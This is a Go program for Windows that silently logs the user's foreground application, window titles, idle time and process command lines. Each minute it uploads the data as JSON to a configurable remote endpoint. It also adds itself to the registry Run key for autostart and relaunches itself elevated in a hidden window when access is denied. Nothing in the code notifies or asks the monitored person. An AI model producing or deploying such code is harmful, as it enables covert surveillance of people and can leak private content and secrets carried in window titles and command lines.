package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/lxn/win"
	"github.com/shirou/gopsutil/process"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

type Activity struct {
	UserID           string `json:"user_id"`
	Timestamp        int64  `json:"timestamp"`
	ProcessName      string `json:"process_name"`
	WindowTitle      string `json:"window_title"`
	MouseIdleSeconds int    `json:"mouse_idle_seconds"`
	IsFullscreen     bool   `json:"is_fullscreen"`
	ExtraInfo        string `json:"extra_info,omitempty"`
}

func getForegroundProcessName() (string, int32, error) {
	hwnd := win.GetForegroundWindow()
	if hwnd == 0 {
		return "", 0, fmt.Errorf("无法获取前台窗口句柄")
	}
	var pid uint32
	win.GetWindowThreadProcessId(hwnd, &pid)
	p, err := process.NewProcess(int32(pid))
	if err != nil {
		return "", int32(pid), err
	}
	name, err := p.Name()
	return name, int32(pid), err
}

func getWindowTitle(hwnd uintptr) (string, error) {
	user32 := syscall.NewLazyDLL("user32.dll")
	getWindowTextLengthW := user32.NewProc("GetWindowTextLengthW")
	getWindowTextW := user32.NewProc("GetWindowTextW")

	length, _, _ := getWindowTextLengthW.Call(hwnd)
	if length == 0 {
		return "", nil
	}
	buf := make([]uint16, length+1)
	getWindowTextW.Call(hwnd, uintptr(unsafe.Pointer(&buf[0])), length+1)
	return syscall.UTF16ToString(buf), nil
}

func getIdleSeconds() (int, error) {
	user32 := syscall.NewLazyDLL("user32.dll")
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	getLastInputInfo := user32.NewProc("GetLastInputInfo")
	getTickCount := kernel32.NewProc("GetTickCount")

	type LASTINPUTINFO struct {
		CbSize uint32
		DwTime uint32
	}
	lii := LASTINPUTINFO{CbSize: uint32(unsafe.Sizeof(LASTINPUTINFO{}))}
	ret, _, err := getLastInputInfo.Call(uintptr(unsafe.Pointer(&lii)))
	if ret == 0 {
		return 0, err
	}
	tick, _, _ := getTickCount.Call()
	idle := (uint32(tick) - lii.DwTime) / 1000
	return int(idle), nil
}

func isFullscreen(hwnd uintptr) bool {
	user32 := syscall.NewLazyDLL("user32.dll")
	getWindowRect := user32.NewProc("GetWindowRect")
	monitorFromWindow := user32.NewProc("MonitorFromWindow")
	getMonitorInfo := user32.NewProc("GetMonitorInfoW")

	type RECT struct {
		Left, Top, Right, Bottom int32
	}
	type MONITORINFO struct {
		CbSize    uint32
		RcMonitor RECT
		RcWork    RECT
		DwFlags   uint32
	}
	var rect RECT
	getWindowRect.Call(hwnd, uintptr(unsafe.Pointer(&rect)))
	monitor, _, _ := monitorFromWindow.Call(hwnd, 2)
	mi := MONITORINFO{CbSize: uint32(unsafe.Sizeof(MONITORINFO{}))}
	getMonitorInfo.Call(monitor, uintptr(unsafe.Pointer(&mi)))
	return rect.Left == mi.RcMonitor.Left && rect.Top == mi.RcMonitor.Top && rect.Right == mi.RcMonitor.Right && rect.Bottom == mi.RcMonitor.Bottom
}

func getExtraInfo(pid int32, p *process.Process) string {
	exe, _ := p.Exe()
	cmd, _ := p.Cmdline()
	return fmt.Sprintf("exe=%s;cmd=%s", exe, cmd)
}

func activityEqual(a, b *Activity) bool {
	if a == nil || b == nil {
		return false
	}
	return a.ProcessName == b.ProcessName &&
		a.WindowTitle == b.WindowTitle &&
		a.MouseIdleSeconds == b.MouseIdleSeconds &&
		a.IsFullscreen == b.IsFullscreen &&
		a.ExtraInfo == b.ExtraInfo
}

func setAutoStart() error {
	exePath, err := os.Executable()
	if err != nil {
		return err
	}
	exePath, err = filepath.Abs(exePath)
	if err != nil {
		return err
	}
	key, _, err := registry.CreateKey(registry.CURRENT_USER, `Software\\Microsoft\\Windows\\CurrentVersion\\Run`, registry.SET_VALUE)
	if err != nil {
		if strings.Contains(err.Error(), "access is denied") || strings.Contains(err.Error(), "拒绝访问") {
			return windows.ERROR_ACCESS_DENIED
		}
		return err
	}
	defer key.Close()
	return key.SetStringValue("WindowsCaiji", exePath)
}

func runAsAdmin() error {
	exePath, err := os.Executable()
	if err != nil {
		return err
	}
	verb := "runas"
	argv := "--elevated"
	verbPtr, _ := windows.UTF16PtrFromString(verb)
	exePtr, _ := windows.UTF16PtrFromString(exePath)
	argvPtr, _ := windows.UTF16PtrFromString(argv)
	cwd, _ := os.Getwd()
	cwdPtr, _ := windows.UTF16PtrFromString(cwd)
	return windows.ShellExecute(0, verbPtr, exePtr, argvPtr, cwdPtr, windows.SW_HIDE)
}

func main() {
	logFile, err := os.OpenFile("windows_caiji.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		fmt.Printf("[日志文件创建失败] %v\n", err)
	} else {
		log.SetOutput(logFile)
		log.SetFlags(log.LstdFlags | log.Lshortfile)
	}
	defer func() {
		if logFile != nil {
			logFile.Close()
		}
	}()

	isElevated := false
	for _, arg := range os.Args[1:] {
		if arg == "--elevated" {
			isElevated = true
			break
		}
	}
	if err := setAutoStart(); err != nil {
		if err == windows.ERROR_ACCESS_DENIED && !isElevated {
			fmt.Println("[权限不足，尝试提权写注册表]")
			log.Println("[权限不足，尝试提权写注册表]")
			err2 := runAsAdmin()
			if err2 != nil {
				fmt.Printf("[提权失败] %v\n", err2)
				log.Printf("[提权失败] %v", err2)
			}
			os.Exit(0)
		} else {
			fmt.Printf("[自启动注册表写入失败] %v\n", err)
			log.Printf("[自启动注册表写入失败] %v", err)
		}
	}
	userID := os.Getenv("USERNAME")
	var lastActivity *Activity
	baseInterval := time.Minute
	maxInterval := 30 * time.Minute
	backoff := baseInterval
	for {
		hwnd := win.GetForegroundWindow()
		if hwnd == 0 {
			fmt.Println("[未获取到前台窗口，等待]")
			log.Println("[未获取到前台窗口，等待]")
			time.Sleep(baseInterval)
			continue
		}
		title, _ := getWindowTitle(uintptr(hwnd))
		var pid uint32
		win.GetWindowThreadProcessId(hwnd, &pid)
		p, err := process.NewProcess(int32(pid))
		processName := ""
		if err == nil {
			processName, _ = p.Name()
		}
		idle, _ := getIdleSeconds()
		fullscreen := isFullscreen(uintptr(hwnd))
		extraInfo := ""
		if p != nil {
			extraInfo = getExtraInfo(int32(pid), p)
		}
		activity := &Activity{
			UserID:           userID,
			Timestamp:        time.Now().UnixMilli(),
			ProcessName:      processName,
			WindowTitle:      title,
			MouseIdleSeconds: idle,
			IsFullscreen:     fullscreen,
			ExtraInfo:        extraInfo,
		}
		if !activityEqual(activity, lastActivity) {
			// 请将此处替换为您的API上传地址
			apiURL := "YOUR_API_ENDPOINT_HERE"
			data, _ := json.Marshal(activity)
			resp, err := http.Post(apiURL, "application/json", bytes.NewBuffer(data))
			if err != nil {
				fmt.Printf("上传失败: %v\n", err)
				fmt.Printf("%v 后重试\n", backoff)
				log.Printf("上传失败: %v，%v 后重试", err, backoff)
				time.Sleep(backoff)
				backoff *= 2
				if backoff > maxInterval {
					backoff = maxInterval
				}
				continue
			} else {
				fmt.Println("采集并上传成功")
				log.Printf("采集并上传成功: %+v", activity)
				resp.Body.Close()
				lastActivity = activity
				backoff = baseInterval
			}
		} else {
			fmt.Println("无变化，无需上传")
			log.Println("无变化，无需上传")
		}
		time.Sleep(baseInterval)
	}
}
